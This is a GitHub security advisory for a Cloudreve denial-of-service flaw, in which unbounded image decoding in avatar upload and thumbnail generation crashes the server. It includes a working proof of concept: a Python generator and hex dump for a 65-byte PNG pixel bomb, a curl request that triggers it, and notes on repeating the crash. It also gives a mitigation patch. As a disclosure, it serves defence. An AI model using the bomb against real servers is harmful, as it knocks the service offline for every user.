# [M] Cloudreve: Denial of Service - Image decompression / pixel bomb in thumbnail & avatar decoding crashes the server

## Summary
Severity: Medium
Advisory: GHSA-g9j2-8w95-3vwv
CVE: CVE-2026-55497
CWE: CWE-400, CWE-409, CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-24
Source: https://github.com/advisories/GHSA-g9j2-8w95-3vwv
Type: github-advisory

## Affected
- Go: `github.com/cloudreve/Cloudreve/v4` — affected >=0 <4.0.0-20260613024411-3607f79bb44c
- Go: `github.com/cloudreve/Cloudreve/v3` — affected >=0

## Details
## Summary

Cloudreve's built-in image processor decodes user-supplied images with Go's standard-library decoders (`image/png`, `image/jpeg`, `image/gif`) and guards **only the compressed file size** — never the *decoded* pixel dimensions. Go's decoders allocate a pixel buffer sized `bytesPerPixel × width × height` taken straight from the image header (e.g. a PNG's IHDR), with no upper bound on `width`/`height`. A tiny (tens-of-bytes) image that *declares* enormous dimensions therefore forces a multi-gigabyte-to-terabyte allocation (`make([]uint8, …)`), exhausting memory. The resulting out-of-memory condition is a **fatal Go runtime error / kernel OOM-kill that `recover()` cannot catch**, terminating the whole Cloudreve process for all users.

Two reachable sinks share the same root cause:

1. **Avatar upload** (`PUT /api/v4/user/setting/avatar`) — decodes synchronously in the request handler. Any authenticated user. **Cleanest single-request PoC.**
2. **Thumbnail generation** (built-in generator, **enabled by default**) — decodes in the thumbnail queue worker. Reachable for the user's own files *and* for files inside a share, so a planted bomb can be (re)triggered through a public share link.

Post-auth, low privilege. A single 65-byte upload deterministically takes the instance offline.

### Details
### Root cause — decode guarded by file size, not pixel count

The built-in generator is the **default** image thumbnailer:

```go
// inventory/setting.go  @ 26b6b10
"thumb_builtin_enabled":   "1",         // ON by default
"thumb_builtin_max_size":  "78643200",  // 75 MB — a *file size* cap
"thumb_vips_enabled":      "0",         // libvips (which has its own limits) OFF by default
...
"avatar_size":             "4194304",   // 4 MB — a *file size* cap
```
`Builtin.Generate` checks the on-disk/entity size, then hands the raw bytes to the stdlib decoders:

```go
// pkg/thumb/builtin.go:144-152  @ 26b6b10
func (b Builtin) Generate(ctx context.Context, es entitysource.EntitySource, ext string, previous *Result) (*Result, error) {
    if es.Entity().Size() > b.settings.BuiltinThumbMaxSize(ctx) {   // 75 MB compressed-size check ONLY
        return nil, fmt.Errorf("file is too big: %w", ErrPassThrough)
    }
    img, err := NewThumbFromFile(es, ext)   // <-- decode; allocation happens here
    ...
}

// pkg/thumb/builtin.go:34-60  @ 26b6b10
func NewThumbFromFile(file io.Reader, ext string) (*Thumb, error) {
    switch ext {
    case "jpg", "jpeg": img, err = jpeg.Decode(file)
    case "gif":         img, err = gif.Decode(file)
    case "png":         img, err = png.Decode(file)   // <-- unbounded allocation
    ...
    }
}
```

There is **no `image.DecodeConfig` pre-check** and **no dimension/pixel cap** anywhere on the path. The only `Bounds()`/`MaxWidth` references in the package (`builtin.go:70,92,125`, `avatar_size_l=200`) act on the *already-decoded* image and are the *output* resize target — they execute long after the oversized input buffer has been allocated.

### Why the allocation is unbounded (Go stdlib `image/png`)

Go's PNG reader takes the dimensions verbatim from IHDR and rejects only non-positive values — there is no maximum:

```go
// Go src/image/png/reader.go — parseIHDR
w := int32(binary.BigEndian.Uint32(d.tmp[0:4]))
h := int32(binary.BigEndian.Uint32(d.tmp[4:8]))
if w <= 0 || h <= 0 { return FormatError("non-positive dimension") }   // only guard
d.width, d.height = int(w), int(h)
```

On the first IDAT, `readImagePass` allocates the destination image **before** consuming the compressed pixel data, e.g. for colour-type 6 (RGBA, 8-bit):

```go
// Go src/image/png/reader.go — readImagePass
nrgba = image.NewNRGBA(image.Rect(0, 0, width, height))   // make([]uint8, 4*width*height)
```

`image.NewNRGBA` → `pixelBufferLength` → `mul3NonNeg(4, w, h)` only guards against *integer overflow* (returns −1, which panics), not against huge-but-valid sizes. So any `4·w·h` that fits in an `int` and is below the runtime's `maxAlloc` (~2⁴⁸ on amd64) proceeds to `make([]uint8, 4·w·h)`. The allocation occurs even if the IDAT stream is empty/truncated, so the malicious file needs no real pixel data.

`jpeg.Decode` (allocates the `YCbCr`/`RGBA` buffer from the SOF/SOS dimensions, max 65535×65535 → up to ~17 GB) and `gif.Decode` (allocates from the logical-screen / frame dimensions) are affected the same way.

### Why this is a fatal crash, not a handled error

For realistic bomb sizes (GBs–hundreds of GBs, all `< maxAlloc`), `make` proceeds and the process dies by one of:
- **Kernel OOM-killer** sends SIGKILL when the touched pages can't be backed — not catchable by anything; or
- the Go runtime **`throw("out of memory")`** — a *fatal* error, **not** a recoverable `panic`, so `gin.Recovery()` does not save it.

(Only the integer-overflow branch yields a recoverable panic; a competent attacker stays in the fatal-OOM regime, as the PoC does.)

### Reachability of each sink

**Avatar (synchronous, in the HTTP handler):**

```go
// routers/router.go:1269  @ 26b6b10  (under auth.Use(LoginRequired()) → user group)
setting.PUT("avatar", middleware.RequiredScopes(types.ScopeUserInfoWrite), controllers.UploadAvatar)

// service/user/setting.go:158-217  @ 26b6b10
func UpdateUserAvatar(c *gin.Context) error {
    ...
    if c.Request.ContentLength == -1 || c.Request.ContentLength > avatarSettings.MaxFileSize { // 4 MB cap
        return ...CodeFileTooLarge
    }
    return updateAvatarFile(c, u, c.GetHeader("Content-Type"), c.Request.Body, avatarSettings)
}
func updateAvatarFile(...) error {
    ext := "png"
    switch contentType { case "image/jpeg","image/jpg": ext="jpg"; case "image/gif": ext="gif" }
    avatar, err := thumb.NewThumbFromFile(file, ext)   // <-- decode of attacker bytes; no dim check
    ...
}
```

A 65-byte PoC trivially satisfies the 4 MB `ContentLength` cap.

**Thumbnail (queue worker, in-process):** `manager.Thumbnail` → `SubmitAndAwaitThumbnailTask` → `generateThumb` → `pipeline.Generate` (`pkg/filemanager/manager/thumbnail.go:128-145`, `pkg/thumb/pipeline.go:86`). The pipeline tries the **enabled-by-default** built-in generator for `png/jpg/gif` (other generators return `ErrPassThrough` for those extensions). Triggered via `GET /api/v4/file/thumb?uri=…` for the user's own files, and the same generation runs for files reached through a share (`NavigatorCapabilityGenerateThumb`), so a bomb dropped into a public share can be (re)triggered by an anonymous visitor.

## Proof of Concept

### The bomb (65 bytes — included as `pixelbomb.png`)

Generated with:

```python
import struct, zlib, binascii
def chunk(t,d):
    c=t+d; return struct.pack(">I",len(d))+c+struct.pack(">I",binascii.crc32(c)&0xffffffff)
sig=b'\x89PNG\r\n\x1a\n'
W,H=0x7FFFFFFF,0x10                       # 2147483647 x 16
ihdr=struct.pack(">IIBBBBB",W,H,8,6,0,0,0)  # 8-bit, colour-type 6 (RGBA)
png=sig+chunk(b'IHDR',ihdr)+chunk(b'IDAT',zlib.compress(b''))+chunk(b'IEND',b'')
open('pixelbomb.png','wb').write(png)
# Go will attempt make([]uint8, 4*W*H) = 137,438,953,408 bytes (128 GiB)
```

Hex (entire file):

```
8950 4e47 0d0a 1a0a 0000 000d 4948 4452   .PNG........IHDR
7fff ffff 0000 0010 0806 0000 0068 bce2   .............h..
e300 0000 0849 4441 5478 9c03 0000 0000   .....IDATx......
0148 0689 d200 0000 0049 454e 44ae 4260   .H.......IEND.B`
82
```
(Dimensions are tunable: `4·W·H` must stay `< 2⁶³` to avoid the overflow→panic branch and `< maxAlloc`. `2147483647 × 16` → 128 GiB reliably OOM-kills any host; shrink `H` for smaller targets.)

### Trigger (avatar — single request)

```bash
base=https://host/api/v4
curl -s -X PUT "$base/user/setting/avatar" \
     -H "Authorization: Bearer $TOK" \
     -H 'Content-Type: image/png' \
     --data-binary @pixelbomb.png
```

### Observable result

```
# Either the kernel OOM-killer terminates the process:
#   dmesg: "Out of memory: Killed process <pid> (cloudreve)"
# or the Go runtime aborts fatally:
#   fatal error: runtime: out of memory
# The Cloudreve process exits; all users get connection-refused until restart.
```
## Impact

- **Direct primitive**: full availability loss — the process aborts, dropping all in-flight requests/sessions for every tenant on the instance.
- **Persistence / repeatability**: the bomb can be stored (as a file whose thumbnail is generated on demand, or re-uploaded as an avatar), so the instance can be crashed again immediately after each restart; if supervised with auto-restart, the attacker scripts a sustained outage.
- **Amplification**: each request costs the attacker ~65 bytes but costs the server an attempted multi-GB/TB allocation; trivial to repeat/parallelize.
- **No special privilege**: any registered user (avatar). The thumbnail sink lets a planted bomb in a public share be re-triggered anonymously.

## Suggested Mitigation

Cap **decoded pixel dimensions** before fully decoding, in addition to the existing file-size cap. Use `image.DecodeConfig` (reads only the header) and reject images whose `width × height` (or either dimension) exceeds a configurable limit; apply it in `NewThumbFromFile` so both the thumbnail and avatar paths are covered.

```diff
--- a/pkg/thumb/builtin.go
+++ b/pkg/thumb/builtin.go
@@ func NewThumbFromFile(file io.Reader, ext string) (*Thumb, error) {
-    var err error
-    var img image.Image
-    switch ext {
+    const maxPixels = 50 * 1000 * 1000 // e.g. 50 MP; make configurable
+    // Peek header-only to reject pixel/decompression bombs before allocation.
+    var hdrBuf bytes.Buffer
+    cfg, _, err := image.DecodeConfig(io.TeeReader(file, &hdrBuf))
+    if err != nil {
+        return nil, fmt.Errorf("failed to read image config: %w (%w)", err, ErrPassThrough)
+    }
+    if int64(cfg.Width)*int64(cfg.Height) > maxPixels {
+        return nil, fmt.Errorf("image dimensions too large (%dx%d): %w", cfg.Width, cfg.Height, ErrPassThrough)
+    }
+    file = io.MultiReader(&hdrBuf, file) // replay consumed header bytes
+    var img image.Image
+    switch ext {
         case "jpg", "jpeg": img, err = jpeg.Decode(file)
         case "gif":         img, err = gif.Decode(file)
         case "png":         img, err = png.Decode(file)
```

Additionally:
- Apply the same pixel cap to the avatar path (covered automatically if it routes through `NewThumbFromFile`, as it does).
- Consider running image decoding in a memory-limited child process / with `debug.SetMemoryLimit` + a `GOMEMLIMIT`-aware soft fail so a single decode cannot take down the whole server even if a future decoder lacks a header pre-check.

Why sufficient: `DecodeConfig` parses only the header (no large allocation), so the oversized buffer is never created; legitimate images decode unchanged.

## References
- https://github.com/cloudreve/cloudreve/security/advisories/GHSA-g9j2-8w95-3vwv
- https://github.com/cloudreve/cloudreve/commit/3607f79bb44c35d0be4fa8b6e24c0502b51415a9
- https://github.com/cloudreve/cloudreve
- https://github.com/cloudreve/cloudreve/releases/tag/4.17.0
